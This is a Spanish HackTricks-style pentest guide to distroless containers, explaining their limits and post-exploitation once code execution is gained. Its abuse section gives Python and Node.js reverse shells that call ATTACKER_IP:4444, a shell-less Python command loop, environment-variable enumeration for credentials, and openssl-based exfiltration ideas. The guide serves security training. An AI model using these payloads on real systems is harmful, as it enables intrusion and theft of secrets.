# Contenedores Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Una imagen de contenedor **distroless** es una imagen que incluye los **componentes mínimos del runtime necesarios para ejecutar una aplicación específica**, eliminando intencionadamente las herramientas habituales de la distribución, como gestores de paquetes, shells y grandes conjuntos de utilidades genéricas de userland. En la práctica, las imágenes distroless suelen contener únicamente el binario o runtime de la aplicación, sus bibliotecas compartidas, los bundles de certificados y una estructura de sistema de archivos muy pequeña.

La idea no es que distroless sea una nueva primitiva de aislamiento del kernel. Distroless es una **estrategia de diseño de imágenes**. Cambia lo que está disponible **dentro** del sistema de archivos del contenedor, no la forma en que el kernel aísla el contenedor. Esta distinción es importante, porque distroless refuerza el entorno principalmente reduciendo lo que un atacante puede utilizar después de obtener ejecución de código. No reemplaza namespaces, seccomp, capabilities, AppArmor, SELinux ni ningún otro mecanismo de aislamiento del runtime.

## Por qué existe Distroless

Las imágenes distroless se utilizan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- el número de paquetes y binarios que podrían contener vulnerabilidades
- el número de herramientas de post-exploitation disponibles para un atacante de forma predeterminada

Por eso las imágenes distroless son populares en despliegues de aplicaciones en producción. Un contenedor que no contiene ningún shell, ningún gestor de paquetes y casi ninguna herramienta genérica suele ser más fácil de analizar operacionalmente y más difícil de abusar de forma interactiva después de un compromiso.

Algunos ejemplos de familias de imágenes conocidas de estilo distroless incluyen:

- las imágenes distroless de Google
- las imágenes hardened/minimal de Chainguard

## Qué no significa Distroless

Un contenedor distroless **no es**:

- automáticamente rootless
- automáticamente non-privileged
- automáticamente de solo lectura
- automáticamente protegido por seccomp, AppArmor o SELinux
- automáticamente seguro frente a un container escape

Sigue siendo posible ejecutar una imagen distroless con `--privileged`, compartiendo namespaces del host, utilizando bind mounts peligrosos o con un runtime socket montado. En ese escenario, la imagen puede ser minimal, pero el contenedor aún puede ser catastróficamente inseguro. Distroless cambia la **superficie de ataque del userland**, no la **frontera de confianza del kernel**.

## Características operativas habituales

Cuando comprometes un contenedor distroless, lo primero que normalmente notas es que las suposiciones habituales dejan de ser ciertas. Puede que no haya `sh`, ni `bash`, ni `ls`, ni `id`, ni `cat`, y a veces ni siquiera un entorno basado en libc que se comporte como espera tu tradecraft habitual. Esto afecta tanto a offense como a defense, porque la falta de herramientas hace que el debugging, la respuesta ante incidentes y el post-exploitation sean diferentes.

Los patrones más comunes son:

- existe el runtime de la aplicación, pero poco más
- los payloads basados en shell fallan porque no hay ningún shell
- los one-liners habituales de enumeración fallan porque faltan los binarios auxiliares
- las protecciones del sistema de archivos, como un rootfs de solo lectura o `noexec` en ubicaciones tmpfs con permisos de escritura, también suelen estar presentes

Esta combinación es lo que normalmente lleva a hablar de "weaponizing distroless".

## Distroless y Post-Exploitation

El principal desafío ofensivo en un entorno distroless no siempre es el RCE inicial. A menudo es lo que viene después. Si el workload explotado permite ejecutar código en un runtime de lenguaje como Python, Node.js, Java o Go, es posible que puedas ejecutar lógica arbitraria, pero no mediante los workflows habituales centrados en shells que son comunes en otros objetivos Linux.

Esto significa que el post-exploitation suele avanzar en una de tres direcciones:

1. **Utilizar directamente el runtime de lenguaje existente** para enumerar el entorno, abrir sockets, leer archivos o preparar payloads adicionales.
2. **Introducir tus propias herramientas en memoria** si el sistema de archivos es de solo lectura o las ubicaciones con permisos de escritura están montadas con `noexec`.
3. **Abusar de los binarios existentes en la imagen** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuse

### Enumerar el Runtime que ya tienes

En muchos contenedores distroless no hay ningún shell, pero sigue existiendo un runtime de aplicación. Si el objetivo es un servicio Python, Python está presente. Si el objetivo es Node.js, Node está presente. Esto suele proporcionar funcionalidad suficiente para enumerar archivos, leer variables de entorno, abrir reverse shells y preparar ejecución en memoria sin invocar nunca `/bin/sh`.

Un ejemplo sencillo con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un ejemplo sencillo con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperación de variables de entorno, que a menudo incluyen credenciales o endpoints de servicios
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permisos de escritura y secretos montados

### Reverse Shell Without `/bin/sh`

Si la imagen no contiene `sh` o `bash`, una Reverse Shell clásica basada en shell puede fallar inmediatamente. En esa situación, utiliza el runtime del lenguaje instalado.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` no existe, reemplaza la línea final por una ejecución directa de comandos mediante Python o un bucle REPL de Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
De nuevo, si `/bin/sh` está ausente, usa directamente las APIs de filesystem, process y networking de Node en lugar de iniciar un shell.

### Ejemplo completo: bucle de comandos Python sin shell

Si la imagen tiene Python pero no tiene ningún shell, un bucle interactivo sencillo suele ser suficiente para mantener toda la capacidad de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Esto no requiere un binario de shell interactivo. El impacto es prácticamente el mismo que el de un shell básico desde la perspectiva del atacante: ejecución de comandos, enumeración y staging de payloads adicionales mediante el runtime existente.

### Ejecución de herramientas en memoria

Las imágenes Distroless suelen combinarse con:

- `readOnlyRootFilesystem: true`
- tmpfs escribible pero con `noexec`, como `/dev/shm`
- ausencia de herramientas de gestión de paquetes

Esa combinación hace que los flujos de trabajo clásicos de "descargar un binario al disco y ejecutarlo" sean poco fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la principal alternativa.

La página dedicada a esto es:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Las técnicas más relevantes allí son:

- `memfd_create` + `execve` mediante runtimes de scripting
- DDexec / EverythingExec
- memexec
- memdlopen

### Binarios existentes en la imagen

Algunas imágenes Distroless todavía contienen binarios necesarios operativamente que resultan útiles después de un compromise. Un ejemplo observado repetidamente es `openssl`, porque las aplicaciones a veces lo necesitan para tareas relacionadas con criptografía o TLS.

Un patrón de búsqueda rápido es:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` está presente, puede ser utilizable para:

- conexiones TLS salientes
- exfiltración de datos a través de un canal de egress permitido
- staging de datos de payload mediante blobs codificados/cifrados

El abuso exacto depende de lo que esté realmente instalado, pero la idea general es que distroless no significa "ninguna herramienta en absoluto"; significa "muchas menos herramientas que una imagen de distribución normal".

## Comprobaciones

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué binarios de runtime o auxiliares siguen estando disponibles para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Qué es interesante aquí:

- Si no existe ningún shell, pero hay un runtime como Python o Node, el post-exploitation debería pivotar a una ejecución controlada por el runtime.
- Si el sistema de archivos raíz es read-only y `/dev/shm` es writable pero `noexec`, las técnicas de ejecución en memoria adquieren mucha más relevancia.
- Si existen helper binaries como `openssl`, `busybox` o `java`, pueden ofrecer suficiente funcionalidad para bootstrappear un acceso adicional.

## Valores predeterminados del runtime

| Estilo de imagen / plataforma | Estado predeterminado | Comportamiento habitual | Debilitamiento manual común |
| --- | --- | --- | --- |
| Imágenes de estilo Google distroless | Userland mínimo por diseño | Sin shell, sin package manager, solo dependencias de la aplicación/runtime | añadir capas de debugging, shells sidecar, copiar busybox o tooling |
| Imágenes minimalistas de Chainguard | Userland mínimo por diseño | Superficie de paquetes reducida, normalmente centrada en un runtime o servicio | usar `:latest-dev` o variantes de debugging, copiar herramientas durante el build |
| Workloads de Kubernetes que usan imágenes distroless | Depende de la configuración del Pod | Distroless solo afecta al userland; la postura de seguridad del Pod sigue dependiendo de la especificación del Pod y de los valores predeterminados del runtime | añadir debug containers efímeros, mounts del host, configuraciones de Pod privilegiadas |
| Docker / Podman ejecutando imágenes distroless | Depende de los flags de ejecución | Sistema de archivos mínimo, pero la seguridad del runtime sigue dependiendo de los flags y de la configuración del daemon | `--privileged`, compartir namespaces del host, mounts del runtime socket, binds writable del host |

El punto clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor proviene de reducir lo que está disponible dentro del sistema de archivos después del compromise.

## Páginas relacionadas

Para los bypasses de ejecución en el sistema de archivos y en memoria que suelen ser necesarios en entornos distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para el abuso del runtime de contenedores, sockets y mounts que también se aplica a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
